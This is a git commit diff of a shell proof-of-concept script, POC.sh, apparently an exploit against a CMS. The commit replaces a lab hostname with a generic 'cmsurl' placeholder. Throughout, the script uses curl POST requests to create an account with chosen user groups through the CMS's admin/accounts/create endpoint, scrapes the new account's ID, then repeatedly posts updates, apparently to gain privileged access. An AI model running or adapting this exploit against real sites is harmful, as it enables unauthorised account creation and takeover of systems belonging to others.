7026814b6e77a1448b4d20dd74b3b7ad012913ed
SebSecRepos <130188315+SebSecRepos@users.noreply.github.com>
2023-10-06 21:06:17 -0300

    Update POC.sh

--- POC.sh
+++ POC.sh
@@ -4,7 +4,7 @@ name='testing'
 password='testing123'
 
 (
-url="http://casino-royale.local/vip-client-portfolios/?uri=admin/accounts/create"
+url="http://cmsurl/?uri=admin/accounts/create"
 
 data="emailAddress=$email&verifiedEmail=verified&username=$name&newPassword=$password&confirmPassword=$password&userGroups%5B%5D=34&userGroups%5B%5D=33&memo=&status=1&formAction=submit"
 
@@ -13,12 +13,12 @@ curl -s -X POST $url -d $data &>/dev/null
 
 sleep 2
 
-id=$(curl -s -X GET "http://casino-royale.local/vip-client-portfolios/?uri=admin/accounts/list" | grep -B 1 "$email2" | head -n 1 | awk '{print $1}' | sed 's/<td>//g' | sed 's/<\/td>//g' | tr -d '[:space:]')
+id=$(curl -s -X GET "http://cmsurl/?uri=admin/accounts/list" | grep -B 1 "$email2" | head -n 1 | awk '{print $1}' | sed 's/<td>//g' | sed 's/<\/td>//g' | tr -d '[:space:]')
 
 sleep 2
 
 for i in $(seq 0 100); do
-    url1="http://casino-royale.local/vip-client-portfolios/?uri=admin/accounts/update&id=$id"
+    url1="http://cmsurl/?uri=admin/accounts/update&id=$id"
     data1="emailAddress=$email&verifiedEmail=verified&username=$name&newPassword=$password&confirmPassword=$password&userGroups%5B%5D=34&userGroups%5B%5D=33&memo=&status=1&formAction=submit&id=$id"
     url1="$url1"
     curl -s -X POST $url1 -d $data1 
